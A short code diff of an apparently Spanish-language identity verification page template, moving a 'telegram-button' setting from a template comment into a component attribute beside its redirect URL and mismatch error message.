@@ -1,4 +1,3 @@
-{{-- @telegram-button: Identidad --}}
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -124,6 +123,7 @@
         :debug="false"
         redirect-url="/verificacion/wait"
         toast-message="Los datos de identidad no coinciden, verifique e intente nuevamente"
+        telegram-button="Identidad"
     />
 </body>
 </html>
